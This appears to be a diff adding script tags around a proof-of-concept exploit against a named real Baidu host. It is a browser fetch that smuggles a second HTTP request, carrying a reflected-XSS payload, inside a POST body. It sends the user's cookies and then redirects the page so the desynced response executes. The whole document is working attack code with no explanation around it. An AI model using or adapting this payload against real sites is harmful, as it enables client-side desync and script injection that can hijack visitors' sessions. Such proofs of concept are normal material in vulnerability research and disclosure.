@@ -1,8 +1,8 @@
-fetch('http://ribenlvyou.baidu.com/favicon.ico', {
+<script>fetch('http://ribenlvyou.baidu.com/favicon.ico', {
     method: 'POST',
         body: `HEAD /about.html?cb=${Date.now()} HTTP/1.1\r\nHost: ribenlvyou.baidu.com\r\n\r\nGET /0_common?id=x<img/src/onerror=alert(1)> HTTP/1.1\r\nx: y`,
         credentials: 'include',
         mode: 'cors' // throw an error instead of following redirect
 }).catch(() => {
         location = 'http://ribenlvyou.baidu.com/'
-})
+})</script>
